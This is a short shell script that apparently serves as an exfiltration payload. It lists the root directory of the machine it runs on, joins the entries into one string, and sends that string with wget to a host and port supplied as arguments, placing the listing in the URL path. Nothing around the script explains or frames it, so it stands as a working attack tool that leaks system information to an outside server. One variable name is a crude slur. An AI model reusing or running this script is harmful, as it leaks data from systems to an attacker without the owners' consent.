#!/bin/sh

pidor=$(ls / | tr '\n' '_') 
elaman=$1
is=$2

wget $elaman:$is/$pidor
